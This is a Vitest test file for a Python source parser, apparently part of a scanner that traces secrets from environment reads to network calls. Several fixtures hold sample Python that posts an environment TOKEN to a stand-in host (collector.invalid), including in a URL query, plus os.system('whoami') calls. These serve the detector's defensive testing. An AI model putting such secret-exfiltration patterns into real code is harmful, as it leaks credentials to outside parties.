import { describe, expect, it } from 'vitest';
import { parseSource } from './index.js';

describe('Python AST parser', () => {
  it('parses imports, attributes, and dotted module access', () => {
    const parsed = parseSource('tool.py', 'import os\nimport urllib.request\nfrom sqlite3 import connect as db_connect');
    expect(parsed.mode).toBe('ast');
    expect(parsed.diagnostics).toHaveLength(0);
    expect(parsed.imports.map((item) => item.specifier)).toEqual(
      expect.arrayContaining(['os', 'urllib.request', 'sqlite3'])
    );
  });

  it('detects environment reads from os.getenv, os.environ, and imported environ', () => {
    const direct = parseSource('a.py', 'key = os.getenv("API_KEY")');
    const subscript = parseSource('b.py', 'key = os.environ["API_KEY"]');
    const imported = parseSource('c.py', 'from os import environ\nkey = environ.get("API_KEY")');
    for (const parsed of [direct, subscript, imported]) {
      expect(parsed.operations).toEqual(expect.arrayContaining([
        expect.objectContaining({ kind: 'environment.read', scope: 'API_KEY' })
      ]));
    }
  });

  it('propagates taint through variables, dicts, and f-strings to a network sink', () => {
    const parsed = parseSource('worker.py', [
      'import os, requests',
      'token = os.getenv("TOKEN")',
      'payload = {"auth": token}',
      'requests.post("https://collector.invalid/events", json=payload)',
      'requests.get(f"https://collector.invalid/?t={token}")'
    ].join('\n'));
    expect(parsed.secretFlows).toHaveLength(2);
    for (const flow of parsed.secretFlows) {
      expect(flow.sourceName).toBe('TOKEN');
      expect(flow.sinkName).toMatch(/^requests\./);
      expect(flow.destination).toBe('collector.invalid');
    }
    expect(parsed.operations).toEqual(expect.arrayContaining([
      expect.objectContaining({ kind: 'environment.read' }),
      expect.objectContaining({ kind: 'network.connect' })
    ]));
  });

  it('does not create a flow when secret and network values are disconnected', () => {
    const parsed = parseSource('safe.py', [
      'import os, requests',
      'token = os.getenv("TOKEN")',
      'print(token)',
      'requests.get("https://status.invalid/health")'
    ].join('\n'));
    expect(parsed.secretFlows).toHaveLength(0);
  });

  it('maps filesystem, process, database, and messaging operations', () => {
    const parsed = parseSource('tool.py', [
      'import os, subprocess, sqlite3, smtplib',
      'open("notes.txt", "w").write("x")',
      'subprocess.run(["ls", "-la"])',
      'os.system("whoami")',
      'sqlite3.connect("app.db")',
      'smtplib.SMTP("smtp.example.invalid").sendmail("a@b.c", ["x@y.z"], "msg")'
    ].join('\n'));
    expect(parsed.operations).toEqual(expect.arrayContaining([
      expect.objectContaining({ kind: 'filesystem.write', symbol: 'open' }),
      expect.objectContaining({ kind: 'process.execute', symbol: 'subprocess.run' }),
      expect.objectContaining({ kind: 'process.execute', symbol: 'os.system' }),
      expect.objectContaining({ kind: 'database.connect', symbol: 'sqlite3.connect' }),
      expect.objectContaining({ kind: 'messaging.send' })
    ]));
  });

  it('tracks aliased modules and from-imported callables', () => {
    const parsed = parseSource('aliased.py', 'import requests as r\nfrom urllib.request import urlopen\nr.post("https://x.invalid")\nurlopen("https://y.invalid")');
    expect(parsed.calls.map((item) => item.callee)).toEqual(
      expect.arrayContaining(['requests.post', 'urllib.request.urlopen'])
    );
  });

  it('handles functions, classes, decorators, and comprehensions', () => {
    const parsed = parseSource('server.py', [
      'import os, requests',
      '@app.route("/send")',
      'def send():',
      '    token = os.getenv("TOKEN")',
      '    return requests.post("https://x.invalid", data=token)',
      'class Client:',
      '    def run(self):',
      '        return [os.getenv("K") for _ in range(3)]'
    ].join('\n'));
    expect(parsed.diagnostics).toHaveLength(0);
    expect(parsed.secretFlows).toHaveLength(1);
    expect(parsed.operations.some((item) => item.kind === 'environment.read')).toBe(true);
  });

  it('contains parser failures as stable error diagnostics instead of throwing', () => {
    const broken = parseSource('broken.py', 'def f(:');
    expect(broken.diagnostics).toEqual([expect.objectContaining({ code: 'PY_SYNTAX', severity: 'error' })]);
    const unterminated = parseSource('str.py', 'value = "never closed');
    expect(unterminated.diagnostics.some((item) => item.code === 'PY_STRING')).toBe(true);
  });

  it('does not crash on pathologically nested or hostile input', () => {
    const nested = parseSource('nested.py', `x = ${'('.repeat(2_000)}${')'.repeat(2_000)}`);
    expect(nested.diagnostics.some((item) => item.severity === 'error')).toBe(true);
    const fuzz = parseSource('fuzz.py', [
      'import os, requests',
      'x = "a\\nb" * 3',
      'y = f"v={os.getenv(\\"T\\")}"',
      'requests.post(url, data=y)'
    ].join('\n'));
    expect(fuzz.secretFlows.some((item) => item.sourceName === 'T')).toBe(true);
    expect(fuzz.operations.some((item) => item.kind === 'environment.read' && item.scope === 'T')).toBe(true);
  });
});
